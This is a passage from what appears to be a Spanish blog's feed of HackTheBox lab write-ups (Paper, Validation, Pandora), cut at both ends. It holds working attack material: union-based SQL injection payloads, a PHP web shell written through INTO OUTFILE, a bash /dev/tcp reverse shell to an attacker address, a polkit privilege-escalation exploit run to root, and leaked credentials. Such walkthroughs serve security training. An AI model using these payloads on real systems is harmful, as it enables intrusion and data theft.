/.npm/anonymous-cli-metrics.json, si accedemos a ella vemos una consulta en formato JSON.Ruta potencial con JSONVemos que existe un apartado llamado Headers, si entramos en él vemos que aparece uno llamado X-Backend-Server que contiene el dominio office.paper. Vamos a introducir este dominio junto a la dirección IP en el fichero /etc/hosts.❯ echo \"10.10.11.143 office.paper\" | sudo tee -a /etc/hosts Ahora introduciremos el dominio encontrado en el navegador y entraremos a una nueva página web totalmente distinta a la anterior.Nueva página webVamos a enumerar las tecnologías que está utilizando la página. Esto lo podemos hacer utilizando un plugin del navegador llamadado Wappalyzer o utilizando la herramienta whatweb.❯ whatweb http://office.paperhttp://office.paper [200 OK] Apache[2.4.37][mod_fcgid/2.3.9], Bootstrap[1,5.2.3], Country[RESERVED][ZZ], HTML5, HTTPServer[CentOS][Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9], IP[10.10.11.143], JQuery, MetaGenerator[WordPress 5.2.3], OpenSSL[1.1.1k], PHP[7.2.24], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[Blunder Tiffin Inc. &amp;#8211; The best paper company in the electric-city Scranton!], UncommonHeaders[link,x-backend-server], WordPress[5.2.3], X-Backend[office.paper], X-Powered-By[PHP/7.2.24]Vemos que está utilizando una version de wordpress desactualizada, más especificamente, la versión 5.2.3, por lo que posiblemente tenga alguna vulnerabilidad de la que nos podamos aprovechar. Con unas cuantas busquedas vemos que tiene un fallo de seguridad que permite a los usuarios no autenticados ver contenido oculto.ExplotaciónUnicamente tendremos que añadir ?static=1 a la URL para que nos muestre el contenido oculto de la misma. Voy a utilizar la herramienta curl y html2text para hacer la petición y ver la respuesta.❯ curl -s 'http://office.paper?static=1' | html2text# Secret Registration URL of new Employee chat systemhttp://chat.office.paper/register/8qozr226AhkCHZdyYVemos que existe otra página web con un dominio distinto al anterior, parece ser que es utilizada como un chat entre trabajadores, vamos a introducir el dominio junto a la dirección IP en el archivo /etc/hosts❯ echo \"10.10.11.143 chat.office.paper\" | sudo tee -a /etc/hostsInicio de SesiónLa página nos indica que para registrarnos es necesario hacerlo desde una URL secreta, esta URL la encontramos en el mensaje anterior que encontramosRegistrandonos en el chatAl registrarnos e iniciar sesión nos damos cuenta que hemos sido añadidos a un chat, en él vemos que uno de los usuarios del chat ha creado un bot con diversas funciones. Las funciones que más nos llaman la atención son que podemos listar arhivos y leerlos apartir de un directorio, si intentamos interactuar con él mandando un mensaje por el chat veremos que no podemos ya que la sala es solo de lectura, sin embargo, somos capaces de enviarle un mensaje privado.Chat con el botLas primeras cosas que se me vienen a la mente son intentar concatenar algun comando, consiguiendo así un RCE o utilizar un Path Traversal para luego intentar leer alguna contraseña. Primero intentemos concatenar comandos a la orden principal.Intento de inyecciónParece que nos está detectando el intento de inyección de comandos, intentemos ahora ver si podemos utilizar un Path Traversal para leer archivos que no deberiamos.Path TraversalConfirmamos que podemos utilizar un Path Traversal para leer archivos más allá del directorio por defecto. Ahora que podemos leer ficheros de cualquier parte del sistema de archivos (siempre que tengamos los permisos necesarios) podemos intentar ver si tenemos acceso a alguna clave privada ssh o alguna contraseña.Directorio sshVemos que no existe ninguna clave ssh, solo nos queda la opción de encontrar alguna contraseña para luego iniciar sesión con ella. Veamos los recursos almacenados en el directorio del usuario.Contenido almacenado en la carpeta del usuarioVemos la flag del usuario, sin embargo, no podemos leerla ya que no tenemos permisos de lectura sobre ese archivo, además vemos otra carpeta que nos llama la atención, la carpeta hubot, vamos a ver que contiene.Contenido carpeta hubotMirando uno a uno todos los ficheros contenidos en la carpeta hubot nos encontramos con el fichero .env que contiene las credenciales del bot con el que estamos interactuando en la página web. Vamos a intentar iniciar sesión con esas credenciales en la página web.CredencialesIntento inicio de sesiónVemos que el bot no está permitido para loguearse contra la página web, aun así podemos loguearnos en otros sitios, como en ssh utilizando uno de los usuarios que hemos encontrado antes y la contraseña que acabamos de encontrar.❯ ssh dwight@10.10.11.143dwight@10.10.11.143's password: ❯ whoami dwight Post-explotaciónLo primero, vamos a leer la flag del usuario.❯ cat user.txt b541bc24493b9747****************Veamos si nuestro usuario puede correr algun binario con sudo.❯ sudo -lpassword: Sorry, user dwight may not run sudo on paper.Resulta que no podemos ejecutar sudo, veamos si existe algún binario con permisos SUID que nos permita escalar privilegios.❯ find / -perm -u=s 2&gt;/dev/null/usr/bin/fusermount/usr/bin/chage/usr/bin/gpasswd/usr/bin/newgrp/usr/bin/mount/usr/bin/su/usr/bin/umount/usr/bin/crontab/usr/bin/passwd/usr/bin/chfn/usr/bin/chsh/usr/bin/at\t\t\t\t\t---SKIP---Seguimos sin tener algo que nos llame la atención, como no estamos encontrando algo interesante vamos a traernos linpeas para que nos haga un reconocimiento más a fondo.Máquina víctima❯ nc -nlvp 4444 &gt; linpeas.shNuestra máquina❯ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh❯ nc 10.10.11.143 4444 &lt; linpeas.sh❯ CTRL + CYa nos hemos traido el binario de linpeas a la máquina víctima, vamos a asignarle permisos ejecución y vamos a ejecutarlo❯ chmod +x linpeas.sh❯ ./linpeas.sh╔══════════╣ CVEs CheckVulnerable to CVE-2021-3560Linpeas nos reporta que la máquina tiene una vulnerabilidad que puede ser explotada con el CVE-2021-3560, más información sobre la vulnerabilidad en el siguiente post. Vamos a utilizar el exploit del siguiente repositorio de github.Máquina víctima❯ nc -nlvp 4444 &gt; CVE-2021-3560.shNuestra máquina❯ wget https://raw.githubusercontent.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/main/poc.sh❯ nc 10.10.11.143 4444 &lt; poc.sh❯ CTRL + CVamos a asignarle los permisos necesarios y vamos a ejecutarlo (es posible que haga falta ejecutarlo varias veces).❯ chmod +x CVE-2021-3560.sh❯ ./CVE-2021-3560.sh -u=xdann1 -p=xdann1[!] Username set as : xdann1[!] No Custom Timing specified.[!] Timing will be detected Automatically[!] Force flag not set.[!] Vulnerability checking is ENABLED![!] Starting Vulnerability Checks...[!] Checking distribution...[!] Detected Linux distribution as \"centos\"[!] Checking if Accountsservice and Gnome-Control-Center is installed[+] Accounts service and Gnome-Control-Center Installation Found!![!] Checking if polkit version is vulnerable[+] Polkit version appears to be vulnerable!![!] Starting exploit...[!] Inserting Username xdann1...Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required[+] Inserted Username xdann1 with UID 1005![!] Inserting password hash...[!] It looks like the password insertion was succesful![!] Try to login as the injected user using su - xdann1[!] When prompted for password, enter your password [!] If the username is inserted, but the login fails; try running the exploit again.[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!Ya se debería haber creado nuestro usuario con permisos de sudo, vamos iniciar sesión con él y luego elevar privilegios a root.❯ su xdann1Password: ❯ sudo bashWe trust you have received the usual lecture from the local SystemAdministrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility.[sudo] password for xdann1: ❯ whoami; idrootuid=0(root) gid=0(root) groups=0(root) ❯ cat /root/root.txt 5bec8b6a86a2c3aee****************" }, { "title": "Validation Writeup", "url": "/posts/writeup-validation/", "categories": "Writeup, HTB", "tags": "Linux, CTF, Easy, SQLi, Burpsuite, Credenciales", "date": "2022-06-01 00:00:00 +0200", "snippet": "Máquina Easy, en la que encontramos un SQLi, gracias a esto conseguimos escribir una webshell en el servidor consiguiendo un RCE, por último, encontramos unas credenciales en un archivo de configuración que sirven para el usuario root.Recopilación de InformaciónPrimero vamos a comprobar la conectividad con la máquina.❯ ping -c 1 10.129.97.4PING 10.129.97.4 (10.129.97.4) 56(84) bytes of data.64 bytes from 10.129.97.4: icmp_seq=1 ttl=63 time=31.0 ms--- 10.129.97.4 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 31.015/31.015/31.015/0.000 msEn la salida del comando anterior se puede ver un parámetro llamado ttl, gracias a este parámetro podemos saber que sistema operativo está corriendo en la máquina víctima. GNU/Linux = TTL 64 Windows = TTL 128En este caso, el sistema operativo que está corriendo en la máquina víctima es GNU/Linux.Vamos a usar la herramienta nmap para descubrir que puertos están abiertos y que servicios estan asociados a estos.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.97.4 -oG allPorts -p- &gt; Escanea todos los puertos (65535) –open &gt; Muestra solo los puertos con un estatus “open” -sS &gt; Aplica un TCP SYN Scan –min-rate 5000 &gt; Indica que quiero emitir paquetes no más lentos que 5000 paquetes por segundo -vvv &gt; Muestra la información en pantalla a medida que se descubre -n &gt; Indica que no aplique resolución DNS -Pn &gt; Indica que no aplique el protocolo ARP 10.129.97.4 &gt; Dirección IP que se quiere escanear -oG allPorts &gt; Exporta el output a un fichero grepeable con nombre “allPorts”Este sería el output del escaneo:Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-01 01:30 CESTScanning 10.129.97.4 [65535 ports]PORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 6380/tcp open http syn-ack ttl 624566/tcp open kwtc syn-ack ttl 638080/tcp open http-proxy syn-ack ttl 63Ahora vamos a realizar un escaneo más profundo, también con nmap pero esta vez solamente lanzaremos scripts básicos de enumeración y analizaremos la versión de los puertos abiertos obtenidos anteriormente.❯ nmap -p22,80,4566,8080 -sC -sV 10.129.97.4 -oN targeted -p22,80,4566,8080 &gt; Indica los puertos que se quieren escanear -sC &gt; Lanza scripts básicos de enumeración -sV &gt; Enumera la versión y servicio que está corriendo en los puertos 10.129.97.4 &gt; Dirección IP que se quiere escanear -oN targeted &gt; Exporta el output a un fichero en formato nmap con nombre “targeted”Este sería el output del escaneo:Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-01 01:33 CESTNmap scan report for 10.129.97.4PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)| 256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)|_ 256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)80/tcp open http Apache httpd 2.4.48 ((Debian))|_http-title: Site doesn't have a title (text/html; charset=UTF-8).|_http-server-header: Apache/2.4.48 (Debian)4566/tcp open http nginx|_http-title: 403 Forbidden8080/tcp open http nginx|_http-title: 502 Bad GatewayLos puertos abiertos y sus servicios asocidados son: 22/tcp &gt; ssh 80/tcp &gt; http 4566/tcp &gt; http 8080/tcp &gt; httpEmpezaremos enumerando las tecnologías que está utilizando la página. Esto lo podemos hacer utilizando un plugin del navegador llamadado Wappalyzer o utilizando la herramienta whatweb. Al ser varios servicios http vamos a usar un one-liner para evaluarlos de una vez.❯ for port in $(cat targeted | grep http | grep -oP '\\d{1,5}/tcp' | cut -d \"/\" -f 1 ); do echo \"\\n[*] Puerto $port:\"; whatweb http://10.129.97.4:$port; done[*] Puerto 80:http://10.129.97.4:80 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[10.129.97.4], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23][*] Puerto 4566:http://10.129.97.4:4566 [403 Forbidden] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.129.97.4], Title[403 Forbidden], nginx[*] Puerto 8080:http://10.129.97.4:8080 [502 Bad Gateway] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.129.97.4], Title[502 Bad Gateway], nginxEl nginx del puerto 4566 nos da un código de estado 403 y el nginx del puerto 8080 nos da un código de estado 502, por lo que solamente vamos a poder interactuar con el sevicio web del puerto 80.Ahora podríamos intentar hacer un reconocimiento de rutas con dirsearch, Utilizaremos fuerza bruta para enumerar rutas potenciales.❯ dirsearch -u http://10.129.97.4/ -x 403 -u http://10.129.97.4/ &gt; Indica la url a la que se le van a hacer las peticiones -x 403 &gt; Oculta las peticiones con un código de estadoLas rutas que hemos hallado son los siguientes:Target: http://10.129.97.4/[01:59:09] Starting: [01:59:10] 301 - 307B - /js -&gt; http://10.129.97.4/js/[01:59:20] 200 - 16B - /account.php[01:59:33] 200 - 0B - /config.php[01:59:35] 301 - 308B - /css -&gt; http://10.129.97.4/css/[01:59:41] 200 - 16KB - /index.php[01:59:41] 200 - 16KB - /index.php/login/No tenemos nada demasiado interesante de momento.Busqueda de vulnerabilidadesVamos a ver como es la web.Página WebParece ser que podemos entrar usando un nombre y un país. Vamos a probar si el campo del nombre es vulnerable.XSSXSSVemos que es el vulnerable a un XSS, sin embargo, esto no nos es útil ya que no tenemos a quién robarle la cookie para luego iniciar sesión. Probemos una inyección SQL.Prueba SQLiPrueba SQLiVemos que no estamos provocando ningun error en la query SQL por lo que deducimos que no es vulnerable a una inyección SQL. Pero solamente la hemos probado en el campo del nombre, por lo que aún nos falta probarla en el campo del país, para ello utilizaremos burpsuiteVamos a capturar la petición de tipo POST que enviamos al entrar usando un usario y el país, posteriormente la vamos a enviar al repeater para poder jugar con ella.Interceptando la peticiónAhora, con la petición ya en el repeater intentemos comprobar si podemos conseguir una inyección SQL en el campo del país colocando una comilla simple.Comprobando inyección SQLComo sospechabamos, tenemos una inyección SQL en el campo del país.ExplotaciónMás o menos podemos llegar a intuir como es la query que se manda, tiene que tener un aspecto parecido al siguiente.SELECT username from uhc where country = ['input usuario']; Como hemos visto antes el campo del país es vulnerable a una inyección SQL, usaremos un tipo inyección SQL llamada Union Based la query maliciosa quedaría así: SELECT username from uhc where country = 'Brazil' UNION SELECT 1-- -';Las inyecciones SQL de tipo Union Based nos permiten crear una consulta dentro de la consulta principal, agregando los resultados de la nuestra a la principal. Para ello necesitaremos poner el mismo número de campos en la consulta UNION como tenga la tabla, si no hacemos esto la consulta nos generará un error.Para conseguirlo utilizaremos la orden order by seguido del número de campos que queramos probar, lo que tendremos que hacer es ir variando el número hasta encontrar cual no nos da error y que el siguente si nos lo de.username=xdann1&amp;country=Brazil' ORDER BY 1-- -Vemos que la tabla cuenta solo con un campo, sabiendo esto ya nos podemos poner manos a la obra. Lo primero que haremos será sacar el nombre de la base de datos, la versión y el usuario que está corriendola. Como solo tenemos un campo con el que operar tendremos que recurrir a concatenar con la orden concat. (0x20 significa el caracter espacio en hexadecimal)username=xdann1&amp;country=Brazil' UNION SELECT CONCAT(user(),0x20,database(),0x20,@@version)-- - Usuario &gt; uhc@localhost Base de datos &gt; registration Versión &gt; 10.5.11-MariaDB-1Empezemos buscando que bases de datos existen.username=xdann1&amp;country=Brazil' UNION SELECT schema_name FROM information_schema.schemata-- - Bases de datos existentes &gt; information_schema, performance_schema, mysql y registrationAhora vamos a sacar las tablas existentes en la base de datos registration.username=xdann1&amp;country=Brazil' UNION SELECT table_name FROM information_schema.tables where table_schema=\"registration\"-- - Tablas existentes en la base de datos registration &gt; registrationSaquemos las columnas de la tabla registration.username=xdann1&amp;country=Brazil' UNION SELECT column_name FROM information_schema.columns WHERE table_schema=\"registration\" AND table_name=\"registration\"-- - Columnas de la tabla registration &gt; username, userhash, country y regtimeVamos a sacar toda la información contenida de las columnas username y userhash.username=xdann1&amp;country=Brazil' UNION SELECT CONCAT(username,0x3a,userhash) FROM registration.registration-- -xdann1:c2b5b685495dbbf7ea7d9539d8150f7bxdann1':aed18eeb555ae4135a0fab179b34a001Hemos obtenido los nombres y los hashes de los usuarios, pero no de otros usuarios, sino de los nuestros. Cosas que pasan… Aun así podemos probar otras cosas, por ejemplo, podemos intentar ver si el usuario que está corriendo la base de datos tiene permisos de escritura, si fuera así podríamos subir una web shell que nos de acceso a la máquina víctima.Para poder escribir archivos del lado del servidor necesitamos tres cosas: Usuario con privilegio FILE habilitado Variable secure_file_priv no habilitada Acceso de escritura en la ubicación en la que queramos escribir.Vamos a comprobar que privilegios tiene otorgado nuestro usuario.username=xdann1&amp;country=Brazil' UNION SELECT CONCAT(grantee,0x3a,privilege_type) FROM information_schema.user_privileges WHERE grantee=\"'uhc'@'localhost'\" AND privilege_type=\"FILE\"-- - ‘uhc’@’localhost’:FILEYa sabemos que contamos con los privilegios necesarios, ahora vamos a ver si la variable secure_file_priv está activada. Esta variable se utiliza para determinar desde donde podemos leer/escribir archivos. Un valor vacío en esta variable nos indica que podemos leer/escribir en todo el sistema de archivos. MariaDB trae esta variable con un valor vacío por defecto, igualmente vamos a revisar su valor.username=xdann1&amp;country=Brazil' UNION SELECT CONCAT(variable_name,0x3a,variable_value) FROM information_schema.global_variables WHERE variable_name=\"secure_file_priv\"-- - secure_file_priv:””Ya hemos comprobado que cumplimos con todos los requisitos para poder escribir archivos del lado del servidor. Suponiendo que la web se esté alojando en la ruta del sistema /var/www/html subiremos en esa ruta la web shell.username=xdann1&amp;country=Brazil' UNION SELECT \"&lt;?php system($_REQUEST['cmd']); ?&gt;\" INTO OUTFILE \"/var/www/html/WebShell.php\"-- -Web shellVamos a mandarnos una reverse shell hacia nuestro equipo para trabajar más comodamente. Lo primero de todo, es ponernos en escucha con netcat.❯ nc -nlvp 443listening on [any] 443 ...Ya estando en escucha introducimos el siguiente comando en la web shell, es IMPORTANTE que lo introduzcamos codificado en url. Podemos utilizar páginas web como esta o herramientas como urlencode.bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.16/443 0&gt;&amp;1\"Ya hemos establecido la reverse shell, ahora vamos a tratarla para hacerla completamente funcional.❯ nc -nlvp 443listening on [any] 443 ...Connection from 10.129.97.4:53268❯ script /dev/null -c bashScript started, file is /dev/null❯ CTRL + Z[1]+ Detenido\t\tnc -nlvp 443❯ stty raw -echo; fgnc -nlvp 443\tresetreset: unknow terminal type unknownTerminal type? xterm❯ export SHELL=bash❯ export TERM=xterm❯ stty rows 42 columns 174Post-explotaciónLo primero, vamos a leer la flag del usuario.❯ cat user.txt 64f93146bf458bb8****************Vemos varios archivos en el directorio en el que se aloja la web, uno de ellos nos llama especialmente la atención, el archivo config.php. Lo leemos y encontramos unas credenciales que parecen ser del usuario uhc.❯ cat config.php&lt;?php $servername = \"127.0.0.1\"; $username = \"uhc\"; $password = \"uhc-9qual-global-pw\"; $dbname = \"registration\"; $conn = new mysqli($servername, $username, $password, $dbname);?&gt;Vamos a intentar convertirnos en el usuario uhc.❯ su uhcsu: user uhc does not exist or the user entry does not contain all the required fieldsNos dice que el usuario uhc no existe, vamos a comprobarlo nosotros mismos.❯ cat /etc/passwd | grep uhcNo nos da ningun output por lo que corroboramos que no existe el usuario uhc, intentemos probar la contraseña encontrada con el usuaro root.❯ su root Password: ❯ whoamiroot❯ cat /root/root.txt 79e15433aa1884bb****************" }, { "title": "Pandora Writeup", "url": "/posts/writeup-pandora/", "categories": "Writeup, HTB", "tags": "Linux, CTF, Easy, SNMP, Port Forwarding, SQLi, PATH Hijacking, CVE, CMS, SUID", "date": "2022-05-31 00:00:00 +0200", "snippet": "Máquina Easy, encontramos un puerto abierto en UDP que corre una versión sin casi seguridad, lo enumeramos hasta encontrar unas credenciales válidas para ssh, encontramos una web oculta vulnerable a SQLi en la que conseguimos una reverse shell, por último, nos aprovechamos de un binario SUID junto con un PATH Hijacking para conseguir el root.Recopilación de InformaciónPrimero vamos a comprobar la conectividad con la máquina.❯ ping -c 1 10.10.11.136PING 10.10.11.136 (10.10.11.136) 56(84) bytes of data.64 bytes from 10.10.11.136: icmp_seq=1 ttl=63 time=36.2 ms--- 10.10.11.136 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 36.212/36.212/36.212/0.000 msEn la salida del comando anterior se puede ver un parámetro llamado ttl, gracias a este parámetro podemos saber que sistema operativo está corriendo en la máquina víctima. GNU/Linux = TTL 64 Windows = TTL 128En este caso, el sistema operativo que está corriendo en la máquina víctima es GNU/Linux.Vamos a usar la herramienta nmap para descubrir que puertos están abiertos y que servicios estan asociados a estos.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.136 -oG allPorts -p- &gt; Escanea todos los puertos (65535) –open &gt; Muestra solo los puertos con un estatus “open” -sS &gt; Aplica un TCP SYN Scan –min-rate 5000 &gt; Indica que quiero emitir paquetes no más lentos que 5000 paquetes por segundo -vvv &gt; Muestra la información en pantalla a medida que se descubre -n &gt; Indica que no aplique resolución DNS -Pn &gt; Indica que no aplique el protocolo ARP 10.10.10.11.136 &gt; Dirección IP que se quiere escanear -oG allPorts &gt; Exporta el output a un fichero grepeable con nombre “allPorts”Este sería el output del escaneo:Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 00:58 CESTScanning 10.10.11.136 [65535 ports]PORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 6380/tcp open http syn-ack ttl 63Ahora vamos a realizar un escaneo más profundo, también con nmap pero esta vez solamente lanzaremos scripts básicos de enumeración y analizaremos la versión de los puertos abiertos obtenidos anteriormente.❯ nmap -p22,80 -sC -sV 10.10.11.136 -oN targeted -p22,80 &gt; Indica los puertos que se quieren escanear, en este caso el 22 y 80 -sC &gt; Lanza scripts básicos de enumeración -sV &gt; Enumera la versión y servicio que está corriendo en los puertos 10.10.10.136 &gt; Dirección IP que se quiere escanear -oN targeted &gt; Exporta el output a un fichero en formato nmap con nombre “targeted”Este sería el output del escaneo:Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 01:16 CESTNmap scan report for 10.10.11.136PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)| 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)|_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Play | Landing|_http-server-header: Apache/2.4.41 (Ubuntu)Los puertos abiertos y sus servicios asocidados son: 22/tcp &gt; ssh 80/tcp &gt; httpEmpezaremos enumerando el puerto 80, primero podemos empezar enumerando las tecnologías que está utilizando la página. Esto lo podemos hacer utilizando un plugin del navegador llamadado Wappalyzer o utilizando la herramienta whatweb.❯ whatweb http://10.10.11.136/http://10.10.11.136/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[contact@panda.htb,example@yourmail.com,support@panda.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.136], Open-Graph-Protocol[website], Script, Title[Play | Landing], probably WordPress, X-UA-Compatible[IE=edge]Ahora podríamos intentar hacer un reconocimiento web con dirsearch, Utilizaremos fuerza bruta para enumerar rutas potenciales.❯ dirsearch -u http://10.10.11.136/ -x 403 -u http://10.10.11.136 &gt; Indica la url -x 403 &gt; Oculta las peticiones con un código de estadoLas rutas que hemos hallado son los siguientes:Target: http://10.10.11.136/[01:30:10] Starting: [01:30:27] 301 - 313B - /assets -&gt; http://10.10.11.136/assets/[01:30:27] 200 - 2KB - /assets/[01:30:38] 200 - 33KB - /index.htmlNo tenemos nada demasiado interesante de momento. Vamos a ver si se está aplicando virtualhosting, primero vamos a intentarlo con el dominio encontrado en un correo y luego intentaremos buscar algún subdominio potencial.Añadimos la dirección IP y el dominio en el fichero /etc/hosts, si volvemos a cargar la página pero esta vez usando la url http://panda.htb veremos la página exactamente igual, esto nos indica que no se está usando virtualhosting.Intentemos ver si el dominio cuenta con algún subdominio potencial utilizando la herramienta gobuster.❯ gobuster vhost -u panda.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt vhost &gt; Indica que queremos enumerar subdominios -u panda.htb &gt; Indica dominio desde el que se va a buscar -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt &gt; Indica el diccionario que se va a utilizarTampoco encontramos algún subdominio que nos pueda ayudar. Ya que no estamos encontrando ninguna vía potencial de explotación podemos probar a intentar escanear con nmap los puertos que están utilizando el protocolo UDP.❯ nmap -p- --open -sU --min-rate 5000 -vvv -n -Pn 10.10.11.136 -oG UDPports -p- &gt; Escanea todos los puertos (65535) –open &gt; Muestra solo los puertos con un estatus “open” -sU &gt; Indica escaneo a los puertos con protocolo UDP –min-rate 5000 &gt; Indica que quiero emitir paquetes no m s lentos que 5000 paquetes por segundo -vvv &gt; Muestra la informaci n en pantalla a medida que se descubre -n &gt; Indica que no aplique resoluci n DNS -Pn &gt; Indica que no aplique el protocolo ARP 10.10.10.11.136 &gt; Direcci n IP que se quiere escanear -oG UDP &gt; Exporta el output a un fichero grepeable con nombre “UDPports”Este es el output del escaneo:Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 03:20 CESTScanning 10.10.11.136 [65535 ports]PORT STATE SERVICE REASON161/udp open snmp udp-response ttl 63Los puertos abiertos y sus servicios asocidados son: 161/udp &gt; snmpAhora vamos a hacer un escaneo más exhaustivo sobre el puerto 161/udp❯ nmap -p161 -sUV 20 10.10.11.136 -oN UDPtargetedEste sería el output del escaneo:Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 03:22 CESTNmap scan report for panda.htb (10.10.11.136)PORT STATE SERVICE VERSION161/udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public)Busqueda de vulnerabilidades¿Qué es SNMP?SNMP (Simple Network Manager Protocol) es un protocolo de capa de aplicación basado en IP que intercambia información entre la administración de red y cualquier dispositivo habilitado para SNMP.Ya sabiendo en que consiste el protocolo SNMP podemos intentar enumerarlo, para ello, podemos usar la herramienta snmpwalk, sin embargo, antes de usarla necesitamos de un parámetro del que no contamos, la community strings.❯ snmpwalk -v 1 -c &lt;community strings&gt; 10.10.11.136 -v 1 &gt; Indica la versión de SNMP que se va a usar -c &gt; Indica la community string 10.10.11.136 &gt; Indica que la dirección IP del equipo que queremos enumerarEn este caso la máquina víctima está corriendo la versión 1 del protocolo SNMP. Con unas cuantas búsquedas encontramos esta versión cuenta con poca o ninguna seguridad. SNMP utiliza un esquema de autenticación simple que determina quién puede leer, escribir o acceder a cierta información del MIB (Management Information Base). Cada nodo se identifica mediante la utilización de identificadores OID.ExplotaciónPara conseguir información de equipos que esten corriendo el protocolo SNMP tendremos que enviar una solicitud a la máquina víctima, junto con una cadena para autenticarnos. SNMP utiliza dos cadenas, llamadas community strings. La primera, la cadena read only es utilizada para información de solo lectura y la última, la cadena read-write es utilizada para modificar información.Primero podemos probar con la cadena que viene por defecto, esta es public, si no funciona probaremos con fuerza bruta hasta que encontremos la cadena correcta.❯ snmpwalk -v 1 -c public 10.10.11.136 &gt; snmpenumEl output del escaneo es muy extenso, en específico son 6950 líneas por lo que tendremos que filtrar por palabras clave. Buscando y buscando por el archivo acabo encontrando unas credenciales.HOST-RESOURCES-MIB::hrSWRunParameters.827 = STRING: \"-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'\"Probamos las credenciales encontradas para autenticarnos contra SSH y… ¡estamos dentro!Post-explotaciónSi intentamos leer la flag del usuario veremos que no se encuentra en el home de nuestro usuario. Vamos a buscar donde se encuentra.❯ find / -name user.txt 2&gt;/dev/null/home/matt/user.txtNo podemos leer el contenido debido a que no tenemos permisos de lectura.❯ ls -l user.txt -rw-r----- 1 root matt 33 May 29 23:28 user.txtYa que no tenemos permisos tendremos que ser capaces de convertirnos en el usuario matt, empezaremos enumerando los usuarios existentes a nivel de sistema por si hubiese otros usuarios.❯ cat /etc/passwd | grep sh$root:x:0:0:root:/root:/bin/bashmatt:x:1000:1000:matt:/home/matt:/bin/bashdaniel:x:1001:1001::/home/daniel:/bin/bashVamos a comprobar si nuestro usuario pertenece a algún grupo interesante.❯ groups daniel daniel : danielDe momento no tenemos nada interesante, podemos probar si existe algún binario potencial con permisos SUID.❯ find / -perm -u=s 2&gt;/dev/null/usr/bin/sudo/usr/bin/pkexec/usr/bin/chfn/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/umount/usr/bin/pandora_backup\t\t\t\t\t---SKIP---¡BINGO! Tenemos un binario que nos puede ser de gran ayuda, vamos a analizarlo. Si intentamos leer o ejecutar el binario nos da que no tenemos permisos. Vamos a ver que permisos tiene asignados el binario.❯ ls -l /usr/bin/pandora_backup-rwsr-x--- 1 root matt 16816 Dec 3 15:58 /usr/bin/pandora_backupDe nuevo nos encontramos con que tenemos que convertirnos en el usuario matt, así que intentemos seguir buscando.Si leemos el archivo /etc/hosts nos daremos cuenta de que existe una relación entre la dirección IP de loopback y el dominio pandora.pandora.htb❯ cat /etc/hosts127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb127.0.1.1 pandora\t\t\t\t\t---SKIP---Gracias a esto, podemos deducir que puede existir otra página web. Las páginas web están alojadas en una ruta concreta del sistema, normalmente en /var/www/. Dentro de esta ruta nos encontramos con dos directorios. El primero, llamado html contiene la web a la que podemos acceder de forma normal y el último, llamado pandora parece ser una página web a la que no hemos podido acceder.Como no tenemos acceso desde el exterior vamos a realizar un port forwarding. Primero, deberemos configurar un proxy web de tipo SOCKS desde el que reenviaremos todo el tráfico hasta un túnel SSH y de esta forma podremos acceder a la web que solo se puede visualizar en local de la víctima. Es importante que escogamos como tipo de proxy el SOCKS5 y no el SOCKS4 ya que el útlimo no admite resolución DNS.Configuración del túnel SSH.❯ ssh -D 4444 daniel@10.10.11.136Configuración de proxy web utilizando la extensión de navegador FoxyProxy.Proxy webAhora simplemente introducimos el dominio encontrado y nos cargará la página.Web ocultaAnalizando la web nos damos cuenta que en la parte inferior nos muestra la versión de Pandora FMS. Con una simple busqueda encontramos que esta versión es vulnerable a SQLi (SQL Injection) permitiendonos bypasear el login de administrador y finalmente, conseguir un RCE (Remote Command Execution). Más información en esta 